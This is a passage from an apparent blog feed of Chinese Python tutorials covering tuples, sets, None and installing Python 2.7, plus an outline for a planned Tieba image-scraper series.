<p><img src="https://huhansi.github.io/images/%E5%88%9B%E5%BB%BA%E5%85%83%E7%BB%84.PNG" alt="创建元组"><br>另外，如果要声明一个元组的元组，在括号中单申明一个元素是不够的，要在该元组后面添加一个逗号。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t &#x3D; (&quot;python&quot;)    # 此语法无法声明一个单元素元组，只会申明一个字符串</span><br><span class="line">type(t)</span><br><span class="line">t &#x3D; (&quot;python&quot;,)    # 此语法才可声明一个单元素元组</span><br><span class="line">type(t)</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E5%8D%95%E4%B8%AA%E5%85%83%E7%BB%84.PNG" alt="单个元组"></p>
<h3 id="元组分片"><a href="#元组分片" class="headerlink" title="元组分片"></a>元组分片</h3><p>元组和列表都属于序列，因此，他们的基本操作是一样的。可以使用索引操作符<code>[]</code>来访问元组中的每一个元素，使用切片操作符<code>：</code>来访问元组中的一系列元素。</p>
<p><img src="https://huhansi.github.io/images/%E5%88%86%E7%89%87%E7%A4%BA%E6%84%8F%E5%9B%BE.PNG" alt="分片示意图"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t &#x3D; (1, 2, 3, 4, 5, 6, 7, 8)</span><br><span class="line">t[1]    # 取元组第一个元素</span><br><span class="line">t[-2]    # 取元组第七个元素</span><br><span class="line">t &#x3D; (1, 2, 3, (4, 5, 6))    # 元组嵌套</span><br><span class="line">t[3][2]    # 取元素第四个元素元组中的第三个元素</span><br><span class="line">t &#x3D; (1, 2, 3, [7, 8, 9])    # 元组嵌套列表</span><br><span class="line">t[3][2]    # 取元素第四个元组列表中的第三个元素</span><br><span class="line">t[1:3]    # 取元组第二个到第三个元素</span><br><span class="line">t[1:]    # 取元组第二个到元组末尾的序列</span><br><span class="line">t[:4]    # 取元组头开始到元素第四个元素的序列</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E5%85%83%E7%BB%84%E5%88%86%E7%89%87.PNG" alt="元组分片"></p>
<h3 id="更改元组"><a href="#更改元组" class="headerlink" title="更改元组"></a>更改元组</h3><p>元组是不可变的，也就是说，元组中的元组在被赋值后不能改变。<br>但是，如果元素本身是一个可变数据类型的列表，那么其嵌套项可以被改变。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t &#x3D; (1, 2, 3, [4, 5, 6])</span><br><span class="line">t[0] &#x3D; 7</span><br><span class="line">t[3][0] &#x3D; 8</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E4%BF%AE%E6%94%B9%E5%85%83%E7%BB%84.PNG" alt="修改元组"></p>
<h3 id="删除元组"><a href="#删除元组" class="headerlink" title="删除元组"></a>删除元组</h3><p>元组元素不能修改，那么元组中的元素也是不能删除的，但是可以删除整个元组。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t &#x3D; (1, 2, 3, 4, 5, 6, 7, 9)</span><br><span class="line">del t[1]</span><br><span class="line">del t</span><br><span class="line">t</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E5%88%A0%E9%99%A4%E5%85%83%E7%BB%84.PNG" alt="删除元祖"></p>
<h3 id="元组和列表互换"><a href="#元组和列表互换" class="headerlink" title="元组和列表互换"></a>元组和列表互换</h3><p>元和和列表可以互相转换，分别使用list()和tuple()方法实现。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t &#x3D; (1, 2, 3, 4, 5, 6)</span><br><span class="line">listt &#x3D; list(t)    # 将元组转换为列表</span><br><span class="line">t &#x3D; tuple(listt)    # 将列表转换为元组</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E5%88%97%E8%A1%A8%E5%85%83%E7%BB%84%E4%BA%92%E7%9B%B8%E8%BD%AC%E6%8D%A2.PNG" alt="列表元组互相转换"></p>
<h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><p>集合（Set）也是标准的Python数据类型，它也可以用于存储值。它和列表或者元组之间的区别是，集合中的每一个元素不能出现多次，并且元素之间是无序存储的。<br>由于集合中的元素不能出现多次，这使得集合在很大程度上能够高效地从列表或者元组中删除重复值，并执行取并集、交集等常见的数学操作。</p>
<h3 id="创建集合"><a href="#创建集合" class="headerlink" title="创建集合"></a>创建集合</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s &#x3D; set()    # 声明空集合</span><br><span class="line">s &#x3D; set(&quot;python&quot;)    # 以字符列表，字符串形式声明集合</span><br><span class="line">s &#x3D; set([1, 2, 3, 4])    # 以列表形式声明集合</span><br><span class="line">s &#x3D; &#123;1, 2, 3, 4&#125;    # 以花括号形式声明集合</span><br><span class="line">s &#x3D; &#123;1, 1, 2, 3&#125;    # 如果集合中有重复元素，那么重复元素只会出现一次，即，此时，s &#x3D; &#123;1, 2, 3&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E5%88%9B%E5%BB%BA%E9%9B%86%E5%90%88.PNG" alt="创建集合"></p>
<h3 id="查询和遍历集合"><a href="#查询和遍历集合" class="headerlink" title="查询和遍历集合"></a>查询和遍历集合</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s &#x3D; set([1, 2, 3, 4])</span><br><span class="line">print(4 in s)</span><br><span class="line">for value in s:</span><br><span class="line">    print(value)</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E9%81%8D%E5%8E%86%E9%9B%86%E5%90%88.PNG" alt="遍历集合"></p>
<h3 id="删除集合"><a href="#删除集合" class="headerlink" title="删除集合"></a>删除集合</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s &#x3D; set([1, 2, 3, 4, 5, 6])</span><br><span class="line">s.remove(1)    # 移除元素1</span><br><span class="line">s.add(7)</span><br><span class="line">del s</span><br><span class="line">s</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E5%88%A0%E9%99%A4%E9%9B%86%E5%90%88.PNG" alt="删除集合"></p>
<h2 id="空类型（None）"><a href="#空类型（None）" class="headerlink" title="空类型（None）"></a>空类型（None）</h2><p>表示该值是一个空值，且对其没有特别的操作。空值是Python里的一个特殊的值，用None表示。空值不能理解为0，因为0是有意义的，而None是一个特殊的空值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">None &#x3D;&#x3D; 0</span><br><span class="line">None &#x3D;&#x3D; &#39;&#39;</span><br><span class="line">type(None)</span><br><span class="line">None &#x3D;&#x3D; None</span><br><span class="line">None is None</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/None.PNG" alt="None"></p>
]]></content>
      <categories>
        <category>python学习</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>python简介</title>
    <url>/2018/01/09/python/python101/python-1-introduction/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Python是一种解释型、面向对象、攻台数据类型的高级程序设计语言。是由Guido valn Rossum在1989年发明的。目前python分化为两个版本，2.x和3.x，并且根据官方所属，2.x的版本将在2020年之后不再提供bugfix。<br><strong>Being the last of the 2.x series, 2.7 will have an extended period of maintenance. The current plan is to support it for at least 10 years from the initial 2.7 release. This means there will be bugfix releases until <code>2020</code>.</strong></p>
<p>不过我们无需担心这个，一是2转换成3，很简单，二是XP退出历史舞台也好久了，现在它的份额也还是占了<a href="http://tech.sina.com.cn/roll/2018-01-02/doc-ifyqcsft9369284.shtml" target="_blank" rel="noopener">5.18</a> 左右。</p>
<p>目前，根据2018-01月的TIOBE排行榜，Python使用的人数是处于中上游的。</p>
<p><img src="https://huhansi.github.io/images/2018-01-tiobe-python.png" alt="2018-01 语言TIOBE排行榜"></p>
<p>上面的几款编程语言，各有千秋，如果追求代码执行速度和效率，首选C/C++，它们是比较贴近硬件的语言，著名的*Unix系统就是用C写的；如果需要编写大型的企业级应用，那么可以考虑下Java。</p>
<p>Python给我们提供了非常丰富的库，覆盖了网络、文件、GUI、数据库、文本等大量内容。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>首先，从python<a href="https://www.python.org/" target="_blank" rel="noopener">官网</a>上下载最新的2.x版本，这边是2.7.14。</p>
<p>下载完成之后，双击msi安装包，一直点击next，只需注意勾选安装pip和将python添加的环境变量中。如下图所示</p>
<p><img src="https://huhansi.github.io/images/180129-before-enable-pip.png" alt="勾选添加到环境变量选项"></p>
<p>将Add python.exe选中，next。</p>
<p><img src="https://huhansi.github.io/images/180129-after-enable-pip.png" alt="添加到环境变量"></p>
<p>安装完毕时候，打开控制台，输入python，出现以下类似场景则证明安装成功。</p>
<p><img src="https://huhansi.github.io/images/180129-install-python-success.png" alt="安装成功"></p>
<p>至此，python安装完成。</p>
]]></content>
      <categories>
        <category>python学习</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>入门</tag>
      </tags>
  </entry>
  <entry>
    <title>制作一个python贴吧爬虫（序）</title>
    <url>/2018/01/08/python/%E7%88%AC%E8%99%AB/%E7%88%AC%E8%99%AB-1-%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>很早就想写写博客什么的记录巩固一下自己编写爬虫的经历，经验，总结等东西了。刚好最近有时间，顺带梳理下自己的知识体系。</p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>因为本人刚好是SNSD队长<a href="https://baike.baidu.com/item/%E9%87%91%E6%B3%B0%E5%A6%8D" target="_blank" rel="noopener">金泰妍</a>的粉丝，所以，时不时地回去贴吧中扫荡一波她的美图。但是，一个一个帖子逛下来实在是太费事，就萌生了用爬虫来替代人工的想法。那么，什么是爬虫呢？</p>
<h3 id="网络爬虫"><a href="#网络爬虫" class="headerlink" title="网络爬虫"></a>网络爬虫</h3><p>网络爬虫（又被称为网页蜘蛛、网络机器人），是一种按照一定规则，自动地抓取万维网信息的程序或者脚本。</p>
<p>一些传统的搜索引擎，例如Google，Baidu，Bing等就是一种大型复杂的网络爬虫。</p>
<h3 id="大纲"><a href="#大纲" class="headerlink" title="大纲"></a>大纲</h3><p>接下来会按照下面的顺序，来记录学习过程中的点点滴滴。</p>
<ol>
<li>python相关<ol>
<li>python简介</li>
<li>运行python</li>
<li>python基本类型</li>
<li>基本语法</li>
<li>re模块介绍</li>
<li>python io</li>
<li>requests模块介绍</li>
<li>进程和多线程以及协程</li>
<li>网络编程<ol>
<li>TCP通信</li>
<li>UDP通信</li>
</ol>
</li>
<li>总结</li>
</ol>
</li>
<li>Web相关知识</li>
<li>编写第一个爬虫<ol>
<li>编写爬虫</li>
<li>抓取数据</li>
<li>保存数据</li>
<li>加快抓取速度</li>
</ol>
</li>
<li>解析动态网页</li>
<li>表单交互</li>
<li>验证码交互</li>
<li>使用Scrapy框架</li>
</ol>
<p>暂且只能想到这么点东西，后续再继续更新相关内容</p>
]]></content>
      <categories>
        <category>python爬虫</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
</search>
